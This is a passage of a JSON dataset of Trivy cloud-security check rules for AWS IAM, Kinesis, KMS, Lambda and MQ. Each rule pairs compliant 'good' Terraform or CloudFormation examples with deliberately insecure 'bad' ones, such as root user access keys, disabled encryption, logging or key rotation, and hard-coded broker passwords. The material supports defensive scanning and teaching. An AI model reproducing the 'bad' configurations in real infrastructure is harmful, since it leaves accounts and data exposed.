        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_access_key\n  good:\n    - |-\n      resource \"aws_iam_user\" \"test\" {\n        name = \"lowprivuser\"\n      }\n\n      resource \"aws_iam_access_key\" \"test\" {\n        user = aws_iam_user.test.name\n      }\n  bad:\n    - |-\n      resource \"aws_iam_user\" \"test\" {\n        name = \"root\"\n      }\n\n      resource \"aws_iam_access_key\" \"test\" {\n        user = aws_iam_user.test.name\n      }\n",
        "file_name": "no_root_access_keys.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_root_access_keys.yaml",
        "local_path": "aws/iam/no_root_access_keys.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_access_key"
            ],
            "good": [
              "resource \"aws_iam_user\" \"test\" {\n  name = \"lowprivuser\"\n}\n\nresource \"aws_iam_access_key\" \"test\" {\n  user = aws_iam_user.test.name\n}"
            ],
            "bad": [
              "resource \"aws_iam_user\" \"test\" {\n  name = \"root\"\n}\n\nresource \"aws_iam_access_key\" \"test\" {\n  user = aws_iam_user.test.name\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-NO_USER_ATTACHED_POLICIES",
        "title": "No User Attached Policies",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_user\n  good:\n    - |-\n      resource \"aws_iam_group\" \"developers\" {\n        name = \"developers\"\n        path = \"/users/\"\n      }\n\n      resource \"aws_iam_user\" \"jim\" {\n        name = \"jim\"\n      }\n\n      resource \"aws_iam_group_membership\" \"devteam\" {\n        name = \"developers-team\"\n\n        users = [\n          aws_iam_user.jim.name,\n        ]\n\n        group = aws_iam_group.developers.name\n      }\n\n      resource \"aws_iam_group_policy\" \"ec2policy\" {\n        name  = \"test\"\n        group = aws_iam_group.developers.name\n\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Action\": [\n              \"ec2:Describe*\"\n            ],\n            \"Effect\": \"Allow\",\n            \"Resource\": \"*\"\n          }\n        ]\n      }\n      EOF\n      }\n  bad:\n    - |-\n      resource \"aws_iam_user\" \"jim\" {\n        name = \"jim\"\n      }\n\n      resource \"aws_iam_user_policy\" \"ec2policy\" {\n        name = \"test\"\n        user = aws_iam_user.jim.name\n\n        policy = <<EOF\n      {\n        \"Version\": \"2012-10-17\",\n        \"Statement\": [\n          {\n            \"Action\": [\n              \"ec2:Describe*\"\n            ],\n            \"Effect\": \"Allow\",\n            \"Resource\": \"*\"\n          }\n        ]\n      }\n      EOF\n      }\n",
        "file_name": "no_user_attached_policies.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/no_user_attached_policies.yaml",
        "local_path": "aws/iam/no_user_attached_policies.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_user"
            ],
            "good": [
              "resource \"aws_iam_group\" \"developers\" {\n  name = \"developers\"\n  path = \"/users/\"\n}\n\nresource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_group_membership\" \"devteam\" {\n  name = \"developers-team\"\n\n  users = [\n    aws_iam_user.jim.name,\n  ]\n\n  group = aws_iam_group.developers.name\n}\n\nresource \"aws_iam_group_policy\" \"ec2policy\" {\n  name  = \"test\"\n  group = aws_iam_group.developers.name\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}"
            ],
            "bad": [
              "resource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_user_policy\" \"ec2policy\" {\n  name = \"test\"\n  user = aws_iam_user.jim.name\n\n  policy = <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_LOWERCASE_IN_PASSWORDS",
        "title": "Require Lowercase In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_lowercase_characters = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_lowercase_characters not set\n        # ...\n      }\n",
        "file_name": "require_lowercase_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_lowercase_in_passwords.yaml",
        "local_path": "aws/iam/require_lowercase_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_lowercase_characters = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_lowercase_characters not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_NUMBERS_IN_PASSWORDS",
        "title": "Require Numbers In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_numbers = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_numbers not set\n        # ...\n      }\n",
        "file_name": "require_numbers_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_numbers_in_passwords.yaml",
        "local_path": "aws/iam/require_numbers_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_numbers = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_numbers not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_SYMBOLS_IN_PASSWORDS",
        "title": "Require Symbols In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_symbols = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_symbols not set\n        # ...\n      }\n",
        "file_name": "require_symbols_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_symbols_in_passwords.yaml",
        "local_path": "aws/iam/require_symbols_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_symbols = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_symbols not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-REQUIRE_UPPERCASE_IN_PASSWORDS",
        "title": "Require Uppercase In Passwords",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        # ...\n        require_uppercase_characters = true\n        # ...\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # require_uppercase_characters not set\n        # ...\n      }\n",
        "file_name": "require_uppercase_in_passwords.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/require_uppercase_in_passwords.yaml",
        "local_path": "aws/iam/require_uppercase_in_passwords.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  # ...\n  require_uppercase_characters = true\n  # ...\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # require_uppercase_characters not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-SET_MAX_PASSWORD_AGE",
        "title": "Set Max Password Age",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        max_password_age = 90\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # max_password_age not set\n        # ...\n      }\n",
        "file_name": "set_max_password_age.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/set_max_password_age.yaml",
        "local_path": "aws/iam/set_max_password_age.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  max_password_age = 90\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # max_password_age not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-IAM-SET_MINIMUM_PASSWORD_LENGTH",
        "title": "Set Minimum Password Length",
        "provider": "aws",
        "service": "iam",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy\n  good:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"good_example\" {\n        minimum_password_length = 14\n      }\n  bad:\n    - |-\n      resource \"aws_iam_account_password_policy\" \"bad_example\" {\n        # ...\n        # minimum_password_length not set\n        # ...\n      }\n",
        "file_name": "set_minimum_password_length.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/iam/set_minimum_password_length.yaml",
        "local_path": "aws/iam/set_minimum_password_length.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy"
            ],
            "good": [
              "resource \"aws_iam_account_password_policy\" \"good_example\" {\n  minimum_password_length = 14\n}"
            ],
            "bad": [
              "resource \"aws_iam_account_password_policy\" \"bad_example\" {\n  # ...\n  # minimum_password_length not set\n  # ...\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-KINESIS-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "kinesis",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Kinesis::Stream\n          Properties:\n            Name: GoodExample\n            RetentionPeriodHours: 168\n            ShardCount: 3\n            StreamEncryption:\n              EncryptionType: KMS\n              KeyId: alias/key\n            Tags:\n              - Key: Environment\n                Value: Production\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Kinesis::Stream\n          Properties:\n            Name: BadExample\n            RetentionPeriodHours: 168\n            ShardCount: 3\n            Tags:\n              - Key: Environment\n                Value: Production\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kinesis_stream#encryption_type\n  good:\n    - |-\n      resource \"aws_kinesis_stream\" \"good_example\" {\n        encryption_type = \"KMS\"\n        kms_key_id      = \"my/special/key\"\n      }\n  bad:\n    - |-\n      resource \"aws_kinesis_stream\" \"bad_example\" {\n        encryption_type = \"NONE\"\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/kinesis/enable_in_transit_encryption.yaml",
        "local_path": "aws/kinesis/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Kinesis::Stream\n    Properties:\n      Name: GoodExample\n      RetentionPeriodHours: 168\n      ShardCount: 3\n      StreamEncryption:\n        EncryptionType: KMS\n        KeyId: alias/key\n      Tags:\n        - Key: Environment\n          Value: Production"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Kinesis::Stream\n    Properties:\n      Name: BadExample\n      RetentionPeriodHours: 168\n      ShardCount: 3\n      Tags:\n        - Key: Environment\n          Value: Production"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kinesis_stream#encryption_type"
            ],
            "good": [
              "resource \"aws_kinesis_stream\" \"good_example\" {\n  encryption_type = \"KMS\"\n  kms_key_id      = \"my/special/key\"\n}"
            ],
            "bad": [
              "resource \"aws_kinesis_stream\" \"bad_example\" {\n  encryption_type = \"NONE\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-KMS-AUTO_ROTATE_KEYS",
        "title": "Auto Rotate Keys",
        "provider": "aws",
        "service": "kms",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kms_key#enable_key_rotation\n  good:\n    - |-\n      resource \"aws_kms_key\" \"good_example\" {\n        enable_key_rotation = true\n      }\n    - |-\n      resource \"aws_kms_key\" \"good_example\" {\n        enable_key_rotation = false\n        key_usage           = \"SIGN_VERIFY\"\n      }\n  bad:\n    - |-\n      resource \"aws_kms_key\" \"bad_example\" {\n        enable_key_rotation = false\n      }\n",
        "file_name": "auto_rotate_keys.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/kms/auto_rotate_keys.yaml",
        "local_path": "aws/kms/auto_rotate_keys.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/kms_key#enable_key_rotation"
            ],
            "good": [
              "resource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = true\n}",
              "resource \"aws_kms_key\" \"good_example\" {\n  enable_key_rotation = false\n  key_usage           = \"SIGN_VERIFY\"\n}"
            ],
            "bad": [
              "resource \"aws_kms_key\" \"bad_example\" {\n  enable_key_rotation = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-LAMBDA-ENABLE_TRACING",
        "title": "Enable Tracing",
        "provider": "aws",
        "service": "lambda",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Runtime: nodejs12.x\n            TracingConfig:\n              Mode: Active\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Runtime: nodejs12.x\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_function#mode\n  good:\n    - |-\n      resource \"aws_lambda_function\" \"good_example\" {\n        filename         = \"lambda_function_payload.zip\"\n        function_name    = \"lambda_function_name\"\n        role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n        handler          = \"exports.test\"\n        source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n        runtime = \"nodejs12.x\"\n        tracing_config {\n          mode = \"Active\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_lambda_function\" \"bad_example\" {\n        filename         = \"lambda_function_payload.zip\"\n        function_name    = \"lambda_function_name\"\n        role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n        handler          = \"exports.test\"\n        source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n        runtime = \"nodejs12.x\"\n\n        tracing_config {\n          mode = \"Passthrough\"\n        }\n      }\n",
        "file_name": "enable_tracing.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/lambda/enable_tracing.yaml",
        "local_path": "aws/lambda/enable_tracing.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Runtime: nodejs12.x\n      TracingConfig:\n        Mode: Active"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Runtime: nodejs12.x"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_function#mode"
            ],
            "good": [
              "resource \"aws_lambda_function\" \"good_example\" {\n  filename         = \"lambda_function_payload.zip\"\n  function_name    = \"lambda_function_name\"\n  role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n  handler          = \"exports.test\"\n  source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n  runtime = \"nodejs12.x\"\n  tracing_config {\n    mode = \"Active\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_lambda_function\" \"bad_example\" {\n  filename         = \"lambda_function_payload.zip\"\n  function_name    = \"lambda_function_name\"\n  role             = \"arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\"\n  handler          = \"exports.test\"\n  source_code_hash = filebase64sha256(\"lambda_function_payload.zip\")\n\n  runtime = \"nodejs12.x\"\n\n  tracing_config {\n    mode = \"Passthrough\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-LAMBDA-RESTRICT_SOURCE_ARN",
        "title": "Restrict Source Arn",
        "provider": "aws",
        "service": "lambda",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Role: arn:aws:iam::123456789012:role/lambda-role\n            Runtime: nodejs12.x\n            Timeout: 5\n            TracingConfig:\n              Mode: Active\n            VpcConfig:\n              SecurityGroupIds:\n                - sg-085912345678492fb\n              SubnetIds:\n                - subnet-071f712345678e7c8\n                - subnet-07fd123456788a036\n\n        GoodPermission:\n          Type: AWS::Lambda::Permission\n          Properties:\n            Action: lambda:InvokeFunction\n            FunctionName: !Ref GoodExample\n            Principal: s3.amazonaws.com\n            SourceArn: lambda.amazonaws.com\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Lambda::Function\n          Properties:\n            Code:\n              S3Bucket: my-bucket\n              S3Key: function.zip\n            Handler: index.handler\n            Role: arn:aws:iam::123456789012:role/lambda-role\n            Runtime: nodejs12.x\n            Timeout: 5\n            TracingConfig:\n              Mode: Active\n            VpcConfig:\n              SecurityGroupIds:\n                - sg-085912345678492fb\n              SubnetIds:\n                - subnet-071f712345678e7c8\n                - subnet-07fd123456788a036\n\n        BadPermission:\n          Type: AWS::Lambda::Permission\n          Properties:\n            Action: lambda:InvokeFunction\n            FunctionName: !Ref BadExample\n            Principal: s3.amazonaws.com\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_permission\n  good:\n    - |-\n      resource \"aws_lambda_permission\" \"good_example\" {\n        statement_id  = \"AllowExecutionFromSNS\"\n        action        = \"lambda:InvokeFunction\"\n        function_name = aws_lambda_function.func.function_name\n        principal     = \"sns.amazonaws.com\"\n        source_arn    = aws_sns_topic.default.arn\n      }\n  bad:\n    - |-\n      resource \"aws_lambda_permission\" \"bad_example\" {\n        statement_id  = \"AllowExecutionFromSNS\"\n        action        = \"lambda:InvokeFunction\"\n        function_name = aws_lambda_function.func.function_name\n        principal     = \"sns.amazonaws.com\"\n      }\n",
        "file_name": "restrict_source_arn.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/lambda/restrict_source_arn.yaml",
        "local_path": "aws/lambda/restrict_source_arn.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Role: arn:aws:iam::123456789012:role/lambda-role\n      Runtime: nodejs12.x\n      Timeout: 5\n      TracingConfig:\n        Mode: Active\n      VpcConfig:\n        SecurityGroupIds:\n          - sg-085912345678492fb\n        SubnetIds:\n          - subnet-071f712345678e7c8\n          - subnet-07fd123456788a036\n\n  GoodPermission:\n    Type: AWS::Lambda::Permission\n    Properties:\n      Action: lambda:InvokeFunction\n      FunctionName: !Ref GoodExample\n      Principal: s3.amazonaws.com\n      SourceArn: lambda.amazonaws.com"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Lambda::Function\n    Properties:\n      Code:\n        S3Bucket: my-bucket\n        S3Key: function.zip\n      Handler: index.handler\n      Role: arn:aws:iam::123456789012:role/lambda-role\n      Runtime: nodejs12.x\n      Timeout: 5\n      TracingConfig:\n        Mode: Active\n      VpcConfig:\n        SecurityGroupIds:\n          - sg-085912345678492fb\n        SubnetIds:\n          - subnet-071f712345678e7c8\n          - subnet-07fd123456788a036\n\n  BadPermission:\n    Type: AWS::Lambda::Permission\n    Properties:\n      Action: lambda:InvokeFunction\n      FunctionName: !Ref BadExample\n      Principal: s3.amazonaws.com"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lambda_permission"
            ],
            "good": [
              "resource \"aws_lambda_permission\" \"good_example\" {\n  statement_id  = \"AllowExecutionFromSNS\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.func.function_name\n  principal     = \"sns.amazonaws.com\"\n  source_arn    = aws_sns_topic.default.arn\n}"
            ],
            "bad": [
              "resource \"aws_lambda_permission\" \"bad_example\" {\n  statement_id  = \"AllowExecutionFromSNS\"\n  action        = \"lambda:InvokeFunction\"\n  function_name = aws_lambda_function.func.function_name\n  principal     = \"sns.amazonaws.com\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MQ-ENABLE_AUDIT_LOGGING",
        "title": "Enable Audit Logging",
        "provider": "aws",
        "service": "mq",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              Audit: true\n  bad:\n    - |-\n      Resources:\n        BadBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              Audit: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#audit\n  good:\n    - |-\n      resource \"aws_mq_broker\" \"good_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          audit = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_mq_broker\" \"bad_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          audit = false\n        }\n      }\n",
        "file_name": "enable_audit_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/mq/enable_audit_logging.yaml",
        "local_path": "aws/mq/enable_audit_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        Audit: true"
            ],
            "bad": [
              "Resources:\n  BadBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        Audit: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#audit"
            ],
            "good": [
              "resource \"aws_mq_broker\" \"good_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    audit = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_mq_broker\" \"bad_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    audit = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MQ-ENABLE_GENERAL_LOGGING",
        "title": "Enable General Logging",
        "provider": "aws",
        "service": "mq",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              General: true\n  bad:\n    - |-\n      Resources:\n        BadBroker:\n          Type: AWS::AmazonMQ::Broker\n          Properties:\n            Logs:\n              General: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#general\n  good:\n    - |-\n      resource \"aws_mq_broker\" \"good_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          general = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_mq_broker\" \"bad_example\" {\n        broker_name        = \"example\"\n        engine_type        = \"ActiveMQ\"\n        engine_version     = \"5.15.0\"\n        host_instance_type = \"mq.t2.micro\"\n        user {\n          username = \"ExampleUser\"\n          password = \"MindTheGap\"\n        }\n        logs {\n          general = false\n        }\n      }\n",
        "file_name": "enable_general_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/mq/enable_general_logging.yaml",
        "local_path": "aws/mq/enable_general_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        General: true"
            ],
            "bad": [
              "Resources:\n  BadBroker:\n    Type: AWS::AmazonMQ::Broker\n    Properties:\n      Logs:\n        General: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/mq_broker#general"
            ],
            "good": [
              "resource \"aws_mq_broker\" \"good_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    general = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_mq_broker\" \"bad_example\" {\n  broker_name        = \"example\"\n  engine_type        = \"ActiveMQ\"\n  engine_version     = \"5.15.0\"\n  host_instance_type = \"mq.t2.micro\"\n  user {\n    username = \"ExampleUser\"\n    password = \"MindTheGap\"\n  }\n  logs {\n    general = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-MQ-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "aws",
        "service": "mq",
        "language": "terraform",
